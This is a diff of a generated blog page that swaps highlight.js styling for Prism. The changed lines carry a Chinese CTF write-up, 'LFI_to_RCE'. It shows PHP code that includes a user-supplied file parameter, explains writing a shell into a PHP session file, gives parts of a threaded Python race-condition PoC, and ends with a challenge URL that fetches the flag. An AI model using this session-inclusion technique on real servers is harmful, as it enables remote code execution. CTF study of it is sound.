@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -246,13 +254,13 @@
             
             <div class="markdown-body">
               <h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>题目：</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     show_source(<span class="hljs-string">&#x27;./index.php&#x27;</span>);
     <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p>session文件包含，写入shell到session文件</p>
 <p>poc</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> threading
 <span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, wait
 
@@ -289,7 +297,7 @@ flag = <span class="hljs-string">&#x27;aaaa&#x27;</span>
         futures.append(pool.submit(upload, event))
     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
         futures.append(pool.submit(write, event))
-    wait(futures)</code></pre></div>
+    wait(futures)</code></pre>
 
 <p>访问<code>http://81.70.102.209:10040/?file=/tmp/success</code>得到flag</p>
 
@@ -451,6 +459,8 @@ flag = <span class="hljs-string">&#x27;aaaa&#x27;</span>
 
 
 
+  
+    
   
 
 
